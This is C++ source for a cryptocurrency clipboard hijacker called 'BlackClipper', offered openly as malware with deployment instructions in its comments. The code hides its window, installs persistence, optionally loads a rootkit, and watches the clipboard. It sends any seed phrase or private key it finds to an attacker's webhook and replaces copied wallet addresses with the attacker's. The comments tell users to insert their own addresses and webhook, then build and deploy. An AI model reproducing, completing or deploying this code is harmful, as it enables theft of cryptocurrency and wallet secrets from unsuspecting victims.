#include "format.h"
#include "install.h"

//BlackClipper Source By Skar
// fetures -> crypto wallet clipper, seed phrase grabber
// todo -> wallet injection


// HOW TO USE
// 1. Star Repo
// 2. Go to Settings.h
// 3. change ur cryto addys and webhook
// 4. i recomend keeping other stuff to defualt 
// 5. build and deploy, if u make money feel free to dm me and send me a bit (nah kidding kys brokie)

auto main ( ) -> int
{
	if (bHideWindow) { ::ShowWindow(::GetConsoleWindow(), SW_HIDE); }	
	if (bEnablePersistance) { __install(); __startup(); }
	if (bEnableRootkit) { __rootkit(); } // RECOMEND OR SHIT COULD BRAKE!!!! not gonna anable cus my stub/loader/dropper already loads r77 and double loading rootkit is NOT a good idea!

	std::string sUsernameIp = sReturnUsername();
	__server_send_info("New Client Connected.", "Username: " + sUsernameIp);

	while ( true )
	{
		// i named funcs with __ and prefix and _ as space and vars in camalcase with first letter being type
		std::this_thread::sleep_for(std::chrono::milliseconds(10)); // saving lil bros cpu usage

		if (bDebug) { std::cout << xorstr_("\n [debug] -> enabled!"); } // -- DEBUG
		sText = __read_clip(); // best var naming in com frfr
		if (bDebug) { std::cout << "\n [sText] -> " + sText; } // -- DEBUG

		iCryptoFormat = __check_format(sText); // gonan return a int (0 = not crypto addy, 1 = btc, etc..), if private key or bip32 seed phrase it sends to server
		if (bDebug) { std::cout << "\n [iCryptoFormat] -> " << iCryptoFormat; } // -- DEBUG

		if (iCryptoFormat == 5) { __send_seed_key(sText, iCryptoFormat); } // if its a crypto addy we replace that hoe

		if (sText == sBtcAddy || sText == sEthAddy || sText == sLtcAddy || sText == sUsdtAddy || sText == sSolAddy) {
			continue; 
		}
		if (iCryptoFormat != 0 && iCryptoFormat != 5) {
			__replace(iCryptoFormat);
			__server_send_info("New Clip!", sUsernameIp + " copied an address and that address got clipped!");
		}
	}
	return 0;
}